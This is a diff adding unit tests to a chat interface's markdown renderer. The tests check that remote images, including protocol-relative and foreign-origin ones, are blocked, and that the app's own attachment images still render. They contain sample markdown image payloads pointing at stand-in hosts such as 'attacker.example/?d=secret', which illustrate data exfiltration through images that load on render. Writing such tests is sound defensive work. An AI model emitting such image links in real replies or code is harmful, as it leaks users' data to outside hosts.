@@ -160,3 +160,39 @@ describe('transcriptToMarkdown labels speakers and skips empty turns', () => {
   assert.match(md, /### Orion\n\nhello/);
   assert.ok(!md.includes('### System'), 'blank turn was included');
 });
+
+describe('remote images in a reply are not fetched', () => {
+  const { window, api } = loadInDom();
+  const frag = api.renderMarkdown('![leak](https://attacker.example/?d=secret)');
+  const host = window.document.createElement('div');
+  host.appendChild(frag);
+  // A rendered <img src> fires the request on render, with no user interaction.
+  assert.equal(host.querySelectorAll('img').length, 0, 'remote image survived');
+  const blocked = host.querySelector('.om-img-blocked');
+  assert.ok(blocked, 'expected a placeholder');
+  assert.match(blocked.textContent, /leak/);
+});
+
+describe('protocol-relative and same-path-on-foreign-origin images are blocked', () => {
+  const { window, api } = loadInDom();
+  for (const src of [
+    '//evil.example/api/chat/attachments/' + 'a'.repeat(64),
+    'https://evil.example/api/chat/attachments/' + 'a'.repeat(64),
+  ]) {
+    const frag = api.renderMarkdown(`![x](${src})`);
+    const host = window.document.createElement('div');
+    host.appendChild(frag);
+    assert.equal(host.querySelectorAll('img').length, 0, `not blocked: ${src}`);
+  }
+});
+
+describe("the Hub's own attachments still render", () => {
+  const { window, api } = loadInDom();
+  const sha = 'b'.repeat(64);
+  const frag = api.renderMarkdown(`![shot](/api/chat/attachments/${sha})`);
+  const host = window.document.createElement('div');
+  host.appendChild(frag);
+  const img = host.querySelector('img');
+  assert.ok(img, 'own attachment was blocked');
+  assert.match(img.getAttribute('src'), new RegExp(sha));
+});
